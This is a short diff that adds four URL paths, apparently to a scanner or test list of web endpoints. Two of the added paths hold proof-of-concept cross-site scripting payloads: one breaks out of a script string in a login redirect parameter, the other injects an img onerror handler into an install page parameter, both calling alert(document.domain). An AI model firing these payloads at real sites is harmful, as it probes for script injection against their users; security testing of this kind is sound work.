@@ -1,0 +1,4 @@
+/auth/check
+/auth/newpassword
+/auth/login?to=/92874%27;alert(document.domain)//280
+/install/index.php?1692443074&space=%3Cimg%20src=1%20onerror=alert(document.domain)%3E
